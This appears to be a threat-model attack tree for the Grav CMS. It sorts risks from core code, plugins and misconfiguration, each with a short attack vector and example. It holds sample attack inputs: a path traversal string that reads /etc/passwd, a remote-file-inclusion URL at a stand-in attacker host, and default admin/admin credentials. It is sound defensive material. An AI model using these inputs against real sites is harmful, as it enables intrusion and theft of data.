## Attack Tree Path: [1. Exploit Vulnerabilities in Grav Core [HIGH RISK]](./attack_tree_paths/1__exploit_vulnerabilities_in_grav_core__high_risk_.md)

**Description:**  This section covers vulnerabilities within the core Grav CMS code itself.

*   **1.1 Remote Code Execution (RCE) in Core [HIGH RISK] [CRITICAL]**
    *   **Description:**  Executing arbitrary code on the server hosting the Grav CMS. This is the most severe type of vulnerability.
    *   **1.1.1 Unsafe Deserialization [CRITICAL]**:  
        *   *Attack Vector:*  Grav, or a plugin, might deserialize data from an untrusted source (e.g., user input, a network request) without proper validation. An attacker could craft a malicious serialized object that, when deserialized, executes arbitrary code.
        *   *Example:*  A plugin uses PHP's `unserialize()` function on data submitted through a form without sanitizing it.
    *   **1.1.3 File Inclusion Vulnerabilities [CRITICAL]**:  
        *   *Attack Vector:*  Grav, or a plugin, might include files based on user-supplied input without proper validation.  This can lead to Local File Inclusion (LFI) or Remote File Inclusion (RFI).
        *   *Example:*  A poorly written plugin uses a URL parameter to determine which file to include, allowing an attacker to specify `../../../../etc/passwd` (LFI) or `http://attacker.com/malicious.php` (RFI).

*   **1.2 Authentication Bypass [HIGH RISK]**
    *   **Description:**  Gaining access to the Grav admin panel without valid credentials.
    *   **1.2.1 Exploit flaws in the login mechanism [CRITICAL]**:  
        *   *Attack Vector:*  Weaknesses in the password reset functionality, session management, or other authentication-related code.
        *   *Example:*  A predictable password reset token generation algorithm allows an attacker to guess a valid token and reset an admin's password.  Or, an attacker could intercept and replay a valid authentication cookie.
    *   **1.2.2 Bypass authentication checks due to misconfiguration [CRITICAL]**:  
        *   *Attack Vector:*  Incorrectly configured access control rules or missing authentication checks on specific admin routes.
        *   *Example:*  The `.htaccess` file (or equivalent web server configuration) is misconfigured, allowing direct access to `/admin` without authentication.

*   **1.3 Information Disclosure**
    *   **1.3.1 Access sensitive files due to improper permissions [CRITICAL]**:  
        *   *Attack Vector:* Files or directories containing sensitive information (configuration files, logs, etc.) have overly permissive permissions, allowing unauthorized access.
        *   *Example:* The `user/config/system.yaml` file, which may contain database credentials, is readable by the web server user or even world-readable.

## Attack Tree Path: [2. Exploit Vulnerabilities in Grav Plugins [HIGH RISK]](./attack_tree_paths/2__exploit_vulnerabilities_in_grav_plugins__high_risk_.md)

**Description:** This section focuses on vulnerabilities that may exist within plugins installed on the Grav CMS.

*   **2.1 RCE in a Plugin [HIGH RISK] [CRITICAL]**
    *   **Description:**  Executing arbitrary code on the server through a vulnerability in an installed plugin.
    *   *Attack Vector:*  Similar to RCE in the core, but the vulnerability exists within a plugin's code.  This could involve unsafe deserialization, file inclusion, SQL injection (if the plugin interacts with a database), or other code injection flaws.
    *   *Example:*  A popular plugin has a known RCE vulnerability that hasn't been patched. An attacker exploits this vulnerability to upload a web shell.
*   **2.2 Authentication Bypass in a Plugin [CRITICAL]**
    *   **Description:** Bypassing authentication mechanisms provided by a plugin, potentially granting access to plugin-specific features or even the Grav admin panel.
    *   *Attack Vector:* Similar to authentication bypass in the core, but the vulnerability exists within a plugin's authentication logic.
    *   *Example:* A plugin that adds extra security features has a flaw that allows bypassing its two-factor authentication.

## Attack Tree Path: [3. Exploit Weaknesses in Grav's Configuration [HIGH RISK]](./attack_tree_paths/3__exploit_weaknesses_in_grav's_configuration__high_risk_.md)

**Description:** This section addresses vulnerabilities arising from misconfigurations or insecure settings within the Grav CMS.

*   **3.1 Default or Weak Admin Credentials [CRITICAL]**
    *   **Description:**  Using default or easily guessable credentials to gain admin access.
    *   *Attack Vector:*  The administrator hasn't changed the default admin password, or they've chosen a weak password that can be easily brute-forced or guessed.
    *   *Example:*  The default `admin/admin` credentials are still active.
*   **3.2 Insecure Configuration Settings [CRITICAL]**
    *   **Description:**  Exploiting insecure settings in Grav's configuration files.
    *   *Attack Vector:*  Debug mode is enabled in production, revealing sensitive information in error messages.  Other insecure settings might expose internal details or weaken security mechanisms.
    *   *Example:*  `system.yaml` has `debugger.enabled: true` in a production environment.
*   **3.3 Improper File Permissions [CRITICAL]**
    *   **Description:**  Accessing or modifying sensitive files due to overly permissive file system permissions.
    *   *Attack Vector:*  Configuration files, plugin code, or other sensitive files are readable or writable by unauthorized users (e.g., the web server user).
    *   *Example:*  The `user/plugins` directory is writable by the web server user, allowing an attacker to modify plugin code.
*   **3.4 Exposed Backup Files [CRITICAL]**
    *   **Description:**  Accessing sensitive information from publicly accessible backup files.
    *   *Attack Vector:*  Backup files (e.g., `.zip`, `.tar.gz`) are stored in the webroot or another publicly accessible location.
    *   *Example:*  A backup file named `backup.zip` is located in the website's root directory and can be downloaded by anyone.
